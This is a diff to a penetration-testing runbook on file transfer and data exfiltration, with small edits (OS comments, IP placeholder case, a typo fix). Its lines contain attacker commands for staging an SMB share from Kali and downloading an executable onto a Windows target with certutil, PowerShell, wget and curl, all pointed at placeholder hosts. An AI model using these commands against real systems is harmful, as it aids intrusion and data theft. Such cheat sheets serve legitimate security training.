@@ -21,10 +21,11 @@ This runbook is to help with file transfering or data exfiltration. Transfering 
 ## SMB Server
 
 ```sh
+# kali
 impacket-smbserver share . -smb2support -user user -password test123
 ```
-
 ```cmd
+# windows
 net use z: \\<smbserver>\share /USER:user test123
 copy z:\ .
 ```
@@ -49,13 +50,13 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.
 iwr -uri http://<IP>/file -Outfile c:\temp\file
 wget http://<IP>/file -O file
 curl http://<IP>/file -o file
-certutil -urlcache -f http://<IP>:803/ok.exe ok.exe  
+certutil -urlcache -f http://<ip>:803/ok.exe ok.exe  
 ```
 
 Linux
 ```sh
-wget http://<IP>/file
-curl http://<IP>/file > file
+wget http://<ip>/file
+curl http://<ip>/file > file
 ```
 
 ## Pure-FTPd
@@ -88,7 +89,7 @@ ftp -v -n -s:ftp.txt
 ## tftp
 
 
-Coofig
+Config
 ```
 sudo mkdir /tftp
 sudo chown nobody: /tftp
@@ -109,3 +110,5 @@ Remote File to a Local System
 ```sh 
 scp <user>@192.168.0.20:/home/<directory>/ file
 ```
+
+ <!--- Last Updated July 8, 2024 --->
